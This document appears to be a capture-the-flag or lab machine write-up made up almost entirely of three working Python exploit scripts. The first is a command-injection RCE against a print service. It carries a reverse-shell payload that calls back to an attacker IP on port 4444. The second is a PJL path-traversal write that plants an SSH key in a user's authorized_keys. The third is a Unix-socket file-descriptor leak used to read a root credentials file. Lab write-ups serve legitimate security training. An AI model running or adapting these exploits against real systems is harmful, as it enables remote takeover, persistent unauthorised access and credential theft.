## 1- RCE Exploit Script
```python
import socket

TARGET_IP = "10.129.36.211" 
TARGET_PORT = 1515

cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.31\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
payload = f"test'; {cmd} #'"

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    
    # Step 1: Initiate print job using an empty queue name to bypass the 'in' check
    s.send(b"\x02\n")
    
    # Step 2: Send subcommand specifying control file size and dummy name
    # Format: [subcommand_byte] + "[size] [filename]\n"
    control_file_contents = f"J{payload}\n".encode()
    size = len(control_file_contents)
    
    s.send(b"\x02" + f"{size} control_file\n".encode())
    
    # Wait for the server's acknowledgment byte (\x00)
    ack = s.recv(1)
    
    # Step 3: Send the control file containing our payload
    s.send(control_file_contents)
    
    print("[+] Payload sent successfully.")
    s.close()

if __name__ == "__main__":
    exploit()
```


## 2- Lateral Movement to the user `archivist`
We get this results after running `linpeas.sh` on the target machine
![](Attachements/Pasted%20image%2020260713193719.png)Is is not exploitable tho.

We will use the wrong permissions config to insert our ssh key and connect to the `archivist` user


### Exploit script
```python
import socket

TARGET = "127.0.0.1"
PORT = 9100

pubkey = "ssh-ed25519 YOUR PUBLIC KEY HERE"
data = pubkey.encode()

path = "0:\\..\\.ssh\\authorized_keys"
header = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="{path}" SIZE={len(data)}\r\n'.encode()
footer = b'\x1b%-12345X'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.sendall(header + data + footer)
print(s.recv(4096))
s.close()
```


## 3- Privilege Escalation 

### Exploit Script
```python
import socket, array, os

path = "/run/paperwork/mgmt.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(path)

msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))
print("Message:", msg)

fds = array.array("i")
for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

print("Received FDs:", list(fds))

log_fd, admin_fd = fds

# Read the admin_pins.conf via the leaked root fd
data = os.pread(admin_fd, 1024, 0)
print("admin_pins.conf contents:", data.decode(errors="ignore"))
```

![](../Attachements/Pasted%20image%2020260713200648.png)


Using the found password we connect to root:
![](../Attachements/Pasted%20image%2020260713200804.png)